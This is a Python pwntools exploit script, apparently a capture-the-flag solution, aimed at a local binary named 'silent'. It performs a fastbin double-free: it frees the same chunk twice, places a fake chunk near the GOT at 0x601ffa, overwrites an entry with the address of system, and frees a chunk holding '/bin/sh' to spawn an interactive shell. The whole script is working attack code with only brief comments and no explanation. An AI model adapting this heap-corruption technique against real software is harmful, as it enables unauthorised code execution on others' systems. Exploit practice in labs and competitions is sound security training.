#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
context.log_level = "critical"
context.binary = "./silent"
elf = context.binary

def add(size, cont):
    io.sendline("1")
    io.sendline(str(size))
    io.send(cont)
    sleep(0.01)

def delete(idx):
    io.sendline("2")
    io.sendline(str(idx))

io = process("./silent")

add(0x50, '00000000')
add(0x50, '11111111')
add(0x10, '/bin/sh')

delete(0) # 0
delete(1) # 0 -> 1
delete(0) # 0 -> 1 -> 0

add(0x50, flat(0x601ffa)) #  1 -> 0 ->  target
add(0x50, 'aaaaaaaa') # 0 -> target
add(0x50, 'bbbbbbbb') # target
#  pause()
add(0x50, flat('\0' * 0xe, elf.sym['system']))

delete(2)


io.interactive()
